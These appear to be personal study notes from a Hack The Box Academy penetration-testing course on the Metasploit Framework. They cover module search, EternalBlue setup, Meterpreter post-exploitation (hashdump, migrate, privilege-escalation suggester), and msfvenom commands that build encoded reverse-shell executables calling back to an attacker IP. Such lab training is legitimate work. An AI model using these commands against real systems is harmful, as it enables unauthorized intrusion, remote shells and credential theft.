# 09 — Using the Metasploit Framework

> **Path Phase:** Exploitation | **Difficulty:** Easy | **Sections:** 15

Complete Metasploit workflow — modules, payloads, encoders, Meterpreter, sessions, MSFVenom.

> ℹ️ `<YOUR_IP>` = attacker, `{TARGET}` = target. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Preface
2. Introduction to Metasploit
3. Introduction to MSFconsole
4. Modules
5. Targets
6. Payloads
7. Encoders
8. Databases
9. Plugins & Mixins
10. Sessions & Jobs
11. Meterpreter
12. Writing & Importing Modules
13. Introduction to MSFVenom
14. Firewall and IDS/IPS Evasion
15. Framework Updates

---

## 1–3 — Intro & MSFconsole
```bash
sudo msfdb init
msfconsole
# help ; version ; banner
```

## 4 — Modules
```bash
search type:exploit platform:windows smb
use exploit/windows/smb/ms17_010_eternalblue
info ; show options
set RHOSTS {TARGET}
```

## 5–6 — Targets & Payloads
```bash
show targets ; set target 0
show payloads
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP> ; set LPORT 443
```

## 7 — Encoders
```bash
show encoders
set encoder x86/shikata_ga_nai
```

## 8 — Databases
```bash
db_status
workspace -a engagement
db_nmap -sV {TARGET}
hosts ; services ; vulns
```

## 10 — Sessions & Jobs
```bash
exploit -j          # background job
sessions            # list
sessions -i 1       # interact
background           # from meterpreter
```

## 11 — Meterpreter
```bash
sysinfo ; getuid ; getprivs
hashdump
ps ; migrate <PID>
shell
download <file> ; upload <file>
run post/multi/recon/local_exploit_suggester
```
> **Flag via meterpreter:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 12 — Writing & Importing Modules
```bash
mkdir -p ~/.msf4/modules/exploits/custom
# reload_all
```

## 13 — MSFVenom
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f exe -o s.exe
msfvenom -l payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> -e x86/shikata_ga_nai -i 10 -f exe -o enc.exe
```

## 14–15 — Evasion & Updates
Encoders, custom ports (443/53), staged vs stageless payloads.
```bash
sudo apt update && sudo apt install metasploit-framework
```

## Skills Assessment
```bash
db_nmap -sV -sC {TARGET}
search <found-service>
use <exploit> ; set RHOSTS {TARGET} ; set LHOST <YOUR_IP> ; exploit
# hashdump, local_exploit_suggester, loot flags
```
> **Skills Assessment:** ✅ Completed in lab (flags withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| `msfconsole` | Main framework interface |
| `msfvenom` | Payload generation |
| `meterpreter` | Advanced post-exploitation |
| `db_nmap` | Integrated scanning into DB |

## 🔑 Key Takeaways
- Use **workspaces + db_nmap** to keep engagement data organized.
- `local_exploit_suggester` is a fast privesc win after a session.
- Meterpreter `hashdump` + `migrate` are core post-exploitation moves.
- Know when *not* to use MSF — the exam limits automated exploitation.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
